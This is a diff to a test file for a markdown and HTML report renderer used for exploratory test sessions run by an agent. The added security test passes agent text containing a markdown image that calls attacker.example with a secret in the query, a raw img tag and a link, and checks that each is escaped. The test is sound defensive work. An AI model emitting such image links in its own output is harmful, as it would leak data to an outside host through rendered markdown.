@@ -107,12 +107,26 @@ describe("exploratory session report (REQ-EXEC-15/AC6)", () => {
     const md = renderExploreMarkdown(withClaims, []);
     expect(md).toContain("Items written by the explorer from the goal: compare it with the goal.");
     expect(md).toContain("| 1 | open checkout | A01 goto /app/checkout |");
-    expect(md).toContain("| 2 | <b>pay</b> | **not done**: no test card |");
+    expect(md).toContain("| 2 | \\<b\\>pay\\</b\\> | **not done**: no test card |");
     expect(md).toContain("- Place order stays disabled (A01 goto /app/checkout)");
     expect(md.indexOf("## Findings")).toBeLessThan(md.indexOf("## Explorer's comment"));
     const html = renderExploreHtml(withClaims, []);
     expect(html).toContain("&lt;b&gt;pay&lt;/b&gt;");
     expect(html).not.toContain("<b>pay</b>");
     expect(html).toContain('<tr class="bad"><td>2</td>');
+  });
+
+  it("security review L6: agent text in report.md cannot load an image or make a link", () => {
+    const md = renderExploreMarkdown(
+      ExploreSessionSchema.parse({
+        ...session,
+        summary: "see ![x](https://attacker.example/?q=secret) and <img src=x>",
+        findings: [{ text: "[click](https://attacker.example)", actions: ["A01"] }],
+      }),
+      [],
+    );
+    expect(md).not.toContain("![x](");
+    expect(md).not.toMatch(/(^|[^\\])<img/);
+    expect(md).not.toMatch(/[^\\]\[click\]/);
   });
 });
